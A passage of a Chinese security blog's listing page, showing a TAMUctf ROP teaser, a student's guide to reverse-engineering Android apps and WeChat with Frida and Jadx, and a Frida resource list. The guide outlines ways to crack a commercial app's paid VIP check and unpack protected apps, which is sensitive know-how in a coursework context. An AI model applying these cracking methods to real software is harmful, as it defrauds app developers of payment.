    <a title="valine" href="/Tech/Pwn/9b71e71b216d.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Tech/Pwn/9b71e71b216d.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>当溢出长度过短无法完成完整的ROP时，一般会想到stack pivot，也就是在某个固定的、可控的地址处提前布置好ROP链，然后通过 <code>leave; ret</code> 或是 <code>xchg eax, esp</code> 等方法完成栈迁移。<br>但在本题中，我们没有机会往已知地址写入数据，溢出大小又有限制。官方给出的方法是：通过 <code>sub rsp, 0x18; call vul</code> 这个非常规gadget，将提前布置好的ROP chain放在栈的高位，从而完成ROP chain的链接，我管它叫linked ROP chain。</p>
<p>比赛时和前辈两人看这题看了几个小时，找gadget找了很久也没做出来。比赛结束后发现了两个版本的做法，分别是<a target="_blank" rel="noopener" href="https://github.com/tamuctf/tamuctf-2023/tree/master/pwn/pwnme">官方的</a>和<a target="_blank" rel="noopener" href="https://chovid99.github.io/posts/tamuctf-2023/#pwnme">Chovid99师傅的</a>的。官方的做法比较一般，并且和我们比赛时的思路完全一致（只是我们傻了没发现那个关键gadget），因此本文主要分析官方的做法。</p>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/Tech/Pwn/9b71e71b216d.html#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/PoRE/52df689bd98e.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis' Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Tech/PoRE/52df689bd98e.html" class="post-title-link" itemprop="url">【PoRE#0x05】Proj1 指北</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-04-22 08:34:18" itemprop="dateCreated datePublished" datetime="2023-04-22T08:34:18+08:00">2023-04-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-01-11 16:34:30" itemprop="dateModified" datetime="2024-01-11T16:34:30+08:00">2024-01-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/PoRE/" itemprop="url" rel="index"><span itemprop="name">PoRE</span></a>
                </span>
            </span>

          
            <span id="/Tech/PoRE/52df689bd98e.html" class="post-meta-item leancloud_visitors" data-flag-title="【PoRE#0x05】Proj1 指北" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Tech/PoRE/52df689bd98e.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Tech/PoRE/52df689bd98e.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在上PoRE前，我是Android零基础小白，Java也没写过。<br>刚刚接触那些Lab时，虽然挑战性也是有的，但终归是小打小闹的练习性质，只是助教出的题目。</p>
<p>然后那天，Proj1降临了。</p>
<p>真实软件逆向，而且参考目标还是微信。（微信是操作系统（雾））</p>
<p><img src="http://jyywiki.cn/pages/OS/img/os-classify.jpg" alt="meme"></p>
<p>开始前，前辈和我说过：没有做的时候都会以为这不可能，但其实你可以的。<br>现在做完了PJ1，我也想对后来的同学说：虽然这可能会耗费非常多的时间、精力，但我认为这是值得的！<br>这可是复杂度超高的真实软件、商用软件、<del>以及操作系统软件</del>，逆向成功就已经代表了——你已经有了在安卓世界中遨游的资格。</p>
<p>但是，我当然不会觉得耗费时间多是PJ1的优点。<br>我想在这里总结一些做PJ1的经验，能帮后来者节省一些时间就最好了。</p>
<h2 id="工具-amp-环境"><a href="#工具-amp-环境" class="headerlink" title="工具 &amp; 环境"></a>工具 &amp; 环境</h2><p>在做PJ1时，我们需要准备一个好的调试环境。</p>
<p>最好的调试环境显然是真机，因为性能足够，可以提高调试的体验。如果你有一台备用手机的话，可以尝试网上查询root方法。我的备用手机是红米K30Ultra，使用root方法是Magisk。<br>root成功之后，推荐<a target="_blank" rel="noopener" href="https://github.com/LSPosed/LSPosed">LSPosed</a>模块，这是一个支持Xposed模块的框架，在安卓高版本也可以运行。Magisk有一个<a target="_blank" rel="noopener" href="https://github.com/ViRb3/magisk-frida">MagiskFrida</a>模块可以开机自启Frida-Server，也十分推荐安装。这样一来，Frida和Xposed环境都准备好了。</p>
<p>在模拟器上的调试环境，参考助教的文档说明即可。中间不可避免会遇到问题，这是锻炼定位问题-搜索能力-解决问题能力的好机会。当然，在连续高强度STFW（Search The Friendly Web）之后，是人都不可避免出现头晕、昏昏沉沉、眼冒金星、可能还有腰酸背痛颈椎痛的情况。此时建议出去走走，今天的PJ1就写到这里……</p>
<p>然后就是一些工具的介绍了：</p>
<p><strong>Frida</strong>：Hook主力<br>使用参考<a target="_blank" rel="noopener" href="https://cameudis.github.io/Tech/PoRE/f5ada88c59a3.html">上一期</a><br>由于Frida脚本启动速度极快，对脚本进行修改后，只要在本机上重新启动python脚本就可以看到新的效果，而不需要重启模拟器啥的。因此，推荐即使要开发Xposed模块，也先用Frida进行hook测试。</p>
<p><strong>Xposed框架</strong>：略</p>
<p><strong>DDMS</strong>：动态调试工具<br>在网上搜索DDMS，可以发现这是一个Android Studio已经废弃的功能，但现在依然可以使用，请参考<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/4115be69be7d">这篇文章</a>找到它。<br>主要推荐其中的查看控件id功能。当我想要hook某个按钮绑定的onClick函数，可以直接用DDMS查看那个按钮的控件ID，在逆向工具中根据该ID搜索，就可以找到那个控件的引用，从而找到程序在哪里为其注册了onClick函数。</p>
<p><strong>JEB</strong>：逆向工具<br>JEB不能搜索Java代码，我觉得比Jadx难用，并且占内存似乎也要更多。</p>
<p><strong>Jadx</strong>：逆向工具<br>可以直接在生成的Java伪代码中搜索，功能十分强大好用。<br>可以在这里安装：<a target="_blank" rel="noopener" href="https://github.com/skylot/jadx/releases">https://github.com/skylot/jadx/releases</a><br>推荐安装 <code>jadx-gui with bundled JRE</code> 版本，这个版本可以直接在启动脚本里修改JVM的最大内存，防止Jadx在逆向微信的时候爆炸。方法是找到启动脚本（jadx-gui.bat）中的 <code>&quot;-XX:MaxRAMPercentage=xxx&quot;</code>，然后将后面的那个 <code>xx</code> 改得大一点，比如 <code>90.0</code> 之类的。也可以把这条直接改成 <code>-Xmx4g</code> 来指定具体的内存数量。</p>
<p><strong>PKiD</strong>：查壳工具<br>链接：<a target="_blank" rel="noopener" href="http://www.legendsec.org/1888.html">http://www.legendsec.org/1888.html</a><br>可以查询APP有么有加壳，不过比较古老了。如果加了壳的话，很多代码逻辑都不会在APP里直接看到。我遇到的第一个目标就加壳了，用这个软件检测出来了。</p>
<p><strong>FRIDA-DEXDump</strong>：脱壳工具<br>链接：<a target="_blank" rel="noopener" href="https://github.com/hluwa/FRIDA-DEXDump">https://github.com/hluwa/FRIDA-DEXDump</a><br>可以从内存里把dex代码给Dump出来，存到本地之后可以用jadx直接打开那个文件夹，用dump下来的代码进行分析。</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>面对一个庞大的APP文件，眼花缭乱的代码（经过混淆之后确实是眼花缭乱），你是否迷茫？反正我是挺迷茫的。<br>思路很重要。我们需要<strong>有目标的逆向</strong>，而不是漫无目的的逆向。</p>
<p>我们首要思考的，就是逆向目标和软件逻辑之间的练习。比如想要做一个广告跳过功能，就可以思考：程序如何启动广告？程序如何关闭广告？最直接的入口，就是广告右上角的跳过或者关闭按钮。从按钮入手，找到点击按钮时的程序逻辑，就一定可以找到跳过广告的方法。</p>
<p>微信发送消息也是类似的。程序在什么时候会发送消息呢？当我们点击发送键的时候。所以发送消息的逻辑一定可以通过按钮来找到。</p>
<p>像跳过广告、发送消息这种有明确按钮，可以在手机上通过点击来进行的操作是最好逆向的。但我们也会遇到很多不好逆向的情况，比如我选的任务目标之一是破解一个软件的会员内购；又比如我的另一个目标是微信机器人，需要逆向找到接受消息的逻辑。这种情况下，没有明显的入口可供我们调用，我们就需要从其他的角度入手。</p>
<p>在破解会员内购中，一种思路是支付的时候伪造成功的回复消息；另一种思路是通过某个界面组件在开通VIP前后的变化，找到用以判断VIP的那个关键逻辑函数。这两者都比前者难找一些，不过都是可行的思路，我前后两个思路都试了一遍才成功。</p>
<p>在微信接受消息中，可能就需要从聊天框中显示的对方发来的消息组件入手，找到它的类、它的父类……不过，我并没有老老实实找，因为PJ1文档中给的一篇<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-226674.htm">参考文章</a>作者已经提供了一个非常有用的信息——微信会把聊天数据存到数据库中。（注意，由于很多数据库API都是以字符串为参数的，这大大方便了逆向时的信息获取）</p>
<h2 id="Trick"><a href="#Trick" class="headerlink" title="Trick"></a>Trick</h2><p>有了思路以后，就需要在开始寻找目标了。在寻找目标时，也有一些能够帮助逆向的小技巧。</p>
<p>其中，最有用的技巧一定是jadx中的<strong>搜索功能</strong>。想要找“发送”按钮就搜索“发送”，想要搜索“跳过广告”就搜索“跳过广告”，想要搜索SQL处理逻辑就搜索“SQL”，想要搜索一个抽象接口类的实现类就搜索那个接口的名字……<br>由于jadx的搜索支持类名、函数名、代码、注释、资源，想要搜什么都可以Ctrl+Shift+F召喚出搜索界面！</p>
<p>此外，还推荐多多使用Frida动静态结合地调试。在jadx中右键某函数后，选择“复制为Frida片段”，粘贴到Frida脚本之后，运行脚本，马上就可以看到那个函数的调用情况、参数以及返回值。比如在一个函数中，有大量的在if中的语句，我们不知道它们是否会被执行，此时就可以hook住那个函数，通过打印参数、打印this的各个域等等方式来打印出真实情况下这些判断条件的值，从而得知真实的执行流是怎样的。</p>
<p>最后，我在逆向时遇到的一个比较逆天的情况是真机环境的微信函数名、类名和我本地的安装包中的函数名、类名是不一样的。我本地的安装包可是直接用真机上的微信导出的啊，真不知道哪里出了问题。一种可能是微信做了安装时混淆，另一种可能是我自己把安装包弄混了。遇到hook不上的情况，可以试试打印可以确定的类的各个域和成员函数，如下代码所示：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> listener = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.pluginsdk.ui.chat.q&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> methods = listener.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; methods.<span class="property">length</span>; j++)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(methods[j])</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> fields = listener.<span class="property">class</span>.<span class="title function_">getDeclaredFields</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; fields.<span class="property">length</span>; j++)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(fields[j].<span class="title function_">getName</span>())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="领悟（建议）"><a href="#领悟（建议）" class="headerlink" title="领悟（建议）"></a>领悟（建议）</h2><p>面对一个新的情况，最好的办法是先网上搜一下。我感到使用谷歌进行搜索比百度要强一万倍，并且要多进行搜索，中文搜不到换英文再试试。比如像微信这样的软件，网络上一定会有许多已有的逆向资料（比如PJ1文档里助教给的参考文章），多搜多看，说不定就能遇到想找的东西。</p>
<p>在做PJ的时候，一定要注意保护好身体，注意坐姿和眼睛，不要沉迷逆向无法自拔！逆向的时间是过得很快的，并且有时会不断产生新的希望，让人在电脑面前坐着走不开。但很多时候，故意停下来去做别的事情，可能会产生更新更好的思路。<br>（Windows的话可以开个桌面专门当作逆向的工作桌面，这样停下来只要切换桌面就可以干别的事了）</p>
<p>此外，多和好同学交流一下思路、方法论非常有用，同学的思路往往能够大大地启发人！（可能比我写的破文章要更启发人）</p>
<p>最后，Proj1确实是很具有挑战性的一个作业，也是很难忘的一段旅途。我在Proj1里学到了一些东西，希望能帮助我以后解决更大的挑战，也希望能帮助到一些未来的同学~</p>
<p>P.S. 我也觉得PoRE这个难度坡度太大了，直接上真实的软件……或许可以在中间加一些小练习的，比如frida小练习（？）</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/PoRE/f5ada88c59a3.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis' Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Tech/PoRE/f5ada88c59a3.html" class="post-title-link" itemprop="url">【PoRE#0x04】Frida & Android</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-04-15 21:37:14" itemprop="dateCreated datePublished" datetime="2023-04-15T21:37:14+08:00">2023-04-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-01-11 16:34:30" itemprop="dateModified" datetime="2024-01-11T16:34:30+08:00">2024-01-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/PoRE/" itemprop="url" rel="index"><span itemprop="name">PoRE</span></a>
                </span>
            </span>

          
            <span id="/Tech/PoRE/f5ada88c59a3.html" class="post-meta-item leancloud_visitors" data-flag-title="【PoRE#0x04】Frida & Android" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Tech/PoRE/f5ada88c59a3.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Tech/PoRE/f5ada88c59a3.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><a target="_blank" rel="noopener" href="https://frida.re/">Frida</a>是一个几乎全平台（Windows、MacOS、GNU&#x2F;Linux、IOS、<strong>Android</strong>）的<strong>代码插桩</strong>软件。它能够把谷歌的V8引擎（JavaScript、WebAssembly引擎，即解释器）注入到目标进程中，允许我们编写的JS脚本拥有对于整个进程内存空间的访问权、Hook进程里的代码、直接调用它们等……</p>
<p>Frida功能强大，且使用非常便捷、快速。比如在Android平台，Xposed模块也一样可以做到插桩，但调试起来麻烦得多，每次都要生成APK、安装APK、添加模块、重启环境。而Frida甚至不需要编译！官网对它的描述是 <em>Scriptable</em>，编辑后运行，直接就能够看到结果——你甚至不用重开目标进程！</p>
<p>如何使用Frida？Frida包括一个需要在目标机器上运行的<strong>Frida Server</strong>，同时，在本机上（用于写脚本的机器）提供了命令行工具（Frida CLI tool）、也可以用Python调用Frida API或直接编写JS脚本。</p>
<p>本笔记收集了一些安卓使用Frida的资源。</p>
<p>推荐食用方法是：</p>
<ol>
<li>安装：如果你是PoRE学生，可以直接用助教给的方法，在虚拟机进行安装配置。否则可以参考官网文档。<br> 如果想要用真机进行调试，最好确保使用备用手机，可以使用magisk进行root，可以用一个magisk模块自动开机自启frida服务器，名为MagiskFrida。</li>
<li>从（助教给的例子或）官网的Example中学习，跑跑脚本并改一改脚本，学习Frida &amp; Android的基础用法。</li>
<li>你已经可以直接上手了。遇到想要hook但不知道怎么hook的内容，从第三个链接（Sakura大佬的博客）那边可以学习如何使用，如何new一个类、如何获取一个类的实例等。</li>
<li>python脚本与目标进程通信允许我们在主机上也能放一些逻辑，再加上python强大的第三方库支持，我们可以整很多活。等hook成功了之后，看看第四个链接的内容，想想可以整什么活。</li>
<li>最后是第五个链接，完整的官方文档，可以备着，想要实现某个奇怪的功能或了解某个接口的具体用法时查看。</li>
</ol>
<p>安装配置：<a target="_blank" rel="noopener" href="https://frida.re/docs/android/">官网Android安装文档</a><br>官网Android Example（可以从注释学到基础用法）：<a target="_blank" rel="noopener" href="https://frida.re/docs/examples/android/">Android | Frida</a><br>大部分用法教程与示例：<a target="_blank" rel="noopener" href="https://eternalsakura13.com/2020/07/04/frida/">Frida Android hook | Sakuraのblog</a><br>目标进程与本地python脚本通信教程：<a target="_blank" rel="noopener" href="https://frida.re/docs/messages/">Messages | Frida</a><br>详细的文档：<a target="_blank" rel="noopener" href="https://frida.re/docs/javascript-api/">JavaScript API | Frida</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Cameudis"
      src="/images/ava1.jpg">
  <p class="site-author-name" itemprop="name">Cameudis</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">67</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/cameudis" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;cameudis" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:cameudis@gmail.com" title="E-Mail → mailto:cameudis@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://x.com/cameudis" title="Twitter → https:&#x2F;&#x2F;x.com&#x2F;cameudis" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-dove"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Cameudis</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/pjax/pjax.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>

  <script>
var pjax = new Pjax({
  selectors: [
    'head title',
    '#page-configurations',
    '.content-wrap',
    '.post-toc-wrap',
    '.languages',
    '#pjax'
  ],
  switches: {
    '.post-toc-wrap': Pjax.switches.innerHTML
  },
  analytics: false,
  cacheBust: false,
  scrollTo : !CONFIG.bookmark.enable
});

window.addEventListener('pjax:success', () => {
  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
    var code = element.text || element.textContent || element.innerHTML || '';
    var parent = element.parentNode;
    parent.removeChild(element);
    var script = document.createElement('script');
    if (element.id) {
      script.id = element.id;
    }
    if (element.className) {
      script.className = element.className;
    }
    if (element.type) {
      script.type = element.type;
    }
    if (element.src) {
      script.src = element.src;
      // Force synchronous loading of peripheral JS.
      script.async = false;
    }
    if (element.dataset.pjax !== undefined) {
      script.dataset.pjax = '';
    }
    if (code !== '') {
      script.appendChild(document.createTextNode(code));
    }
    parent.appendChild(script);
  });
  NexT.boot.refresh();
  // Define Motion Sequence & Bootstrap Motion.
  if (CONFIG.motion.enable) {
    NexT.motion.integrator
      .init()
      .add(NexT.motion.middleWares.subMenu)
      .add(NexT.motion.middleWares.postList)
      .bootstrap();
  }
  NexT.utils.updateSidebarPosition();
});
</script>




  















    <div id="pjax">
  

  


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
      notify     : false,
      appId      : 'Ji5y9HTOlb2QGDO0XFlWXNRy-gzGzoHsz',
      appKey     : '6VqGye1352LX381YQDTOaiXs',
      placeholder: "El Psy Congroo",
      avatar     : 'retro',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : true,
      lang       : '' || 'zh-cn',
      path       : location.pathname,
      recordIP   : false,
      serverURLs : ''
    });
  }, window.Valine);
});
</script>

    </div>
</body>
</html>
